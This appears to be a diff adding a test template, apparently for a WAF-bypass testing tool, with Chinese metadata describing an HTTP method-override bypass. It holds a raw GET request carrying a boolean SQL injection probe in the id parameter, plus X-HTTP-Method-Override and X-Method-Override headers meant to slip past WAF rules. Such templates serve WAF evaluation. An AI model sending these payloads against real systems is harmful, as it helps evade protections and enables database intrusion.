@@ -1,0 +1,15 @@
+# @name: HTTP 方法覆盖绕过
+# @tags: get,sqli,header,method-override,spring,id,bypass
+# @color: green
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: method_override_header
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 通过 X-HTTP-Method-Override/X-Method-Override 让后端按 POST/PUT 处理，而 WAF 按请求行 GET 规则检测，规则差异形成绕过（Spring/REST 框架）。
+GET /?id=1'+and+'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+X-HTTP-Method-Override: POST
+X-Method-Override: PUT
+
